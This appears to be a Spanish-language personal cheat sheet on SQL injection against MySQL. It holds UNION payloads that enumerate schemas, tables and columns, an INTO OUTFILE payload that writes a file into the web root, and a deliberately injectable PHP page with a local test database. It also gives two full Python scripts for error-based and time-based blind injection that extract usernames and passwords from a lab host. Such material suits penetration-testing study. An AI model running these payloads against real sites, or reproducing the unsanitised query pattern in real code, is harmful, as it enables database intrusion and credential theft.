# SQL Injection

En esta pagina se recopila todo lo que se vaya haciendo para SQLi.

## MySQL

### Listar bbdd

```sql
' union select schema_name,null from information_schema.schemata
```

### Listar tablas

```sql
' union select table_name,null from information_schema.tables where table_schema='products'-- -
```

### Listar columnas

```sql
' union select column_name,null from information_schema.columns where table_schema='products' and table_name='users'-- -
```

### Insertar fichero

```sql
union select 'hola' into outfile '/var/www/html/prueba.txt'-- -
```

## Creaci贸n de BBDD de pruebas en local

Este es el c贸digo:

```sql

create database pruebasdb;
use pruebasdb;
create table users(id int(32),username varchar(32),nombre varchar(150), password varchar(32));
insert into users(id, username, nombre, password) values(1, 'jamunoz', 'Juanito', 'Juanito123+');
insert into users(id, username, nombre, password) values(2, 'pepito', 'Pepito Grillo', 'pePItoELgrillo');
insert into users(id, username, nombre, password) values(3, 'manolito', 'Manolito Gafotas', 'ManoloElDelBombo2023');

create user 'jamunoz'@'localhost' identified by 'Juan123';
grant all privileges on pruebasdb.* to 'jamunoz'@'localhost';
```

## Creaci贸n de fichero php vulnerable a SQLi

Este es el c贸digo:

```php
<?php

$server = "localhost";
$username = "jamunoz";
$password = "Juan123";
$database = "pruebasdb";

// Conexion a BBDD
$conn = new mysqli($server, $username, $password, $database);

$id = $_GET['id'];

$data = mysqli_query($conn, "select nombre from users where id = '$id'");

$response = mysqli_fetch_array($data);

echo $response['nombre'];

?>
```

## Script para SQLi a ciegas basado en error

```python
#!/usr/bin/python3

import requests, signal, sys, time
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!]Saliendo ...\n")
	sys.exit(1)

# Ctlr + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://172.17.0.2/sqli.php"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)

	p2 = log.progress("Datos extraidos")

	extracted_info = ""

	for position in range(1, 500):
		for character in range(33, 126):
			# sqli_url = main_url + "?id=9 or (select (select ascii(substr(username, %d,1)) from users where id=1)=%d)" % (position, character)
			# BBDDs
			# sqli_url = main_url + "?id=9 or (select (select ascii(substr(group_concat(schema_name), %d,1)) from information_schema.schemata)=%d)" % (position, character)
			# Tablas
			# sqli_url = main_url + "?id=9 or (select (select ascii(substr(group_concat(table_name), %d,1)) from information_schema.tables where table_schema='maripili')=%d)" % (position, character)
			# Columns
			# sqli_url = main_url + "?id=9 or (select (select ascii(substr(group_concat(column_name), %d,1)) from information_schema.columns where table_schema='maripili' and table_name='users')=%d)" % (position, character)
			sqli_url = main_url + "?id=9 or (select (select ascii(substr(group_concat(username,':',password), %d,1)) from users)=%d)" % (position, character)
			p1.status(sqli_url)
			r = requests.get(sqli_url) 

			if r.status_code == 200:
				extracted_info += chr(character)
				p2.status(extracted_info)
				break;

if __name__ == '__main__':

	makeSQLI()

```

## Script para SQLi a ciegas basado en tiempo

```python
#!/usr/bin/python3

import requests, signal, sys, time
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!]Saliendo ...\n")
	sys.exit(1)

# Ctlr + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://172.17.0.2/sqli.php"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(1)

	p2 = log.progress("Datos extraidos")

	extracted_info = ""

	for position in range(1, 100):
		for character in range(33, 126):
			# Get database
			# sqli_url = main_url + "?id=1 and (select sleep(0.35) where ascii(substr(database(),%d,1))=%d)" % (position, character)
			# Get databases
			# sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d,sleep(0.35),1) " % (position, character)
			# Get tables
			# sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='maripili'),%d,1))=%d,sleep(0.35),1) " % (position, character)
			# Get columns
			# sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='maripili' and table_name='users'),%d,1))=%d,sleep(0.35),1) " % (position, character)
			# Get username and password
			sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1) " % (position, character)
			p1.status(sqli_url)
			
			time_start = time.time()

			r = requests.get(sqli_url) 

			time_end = time.time()

			if time_end - time_start > 0.35:
				extracted_info += chr(character)
				p2.status(extracted_info)
				break;

if __name__ == '__main__':

	makeSQLI()

```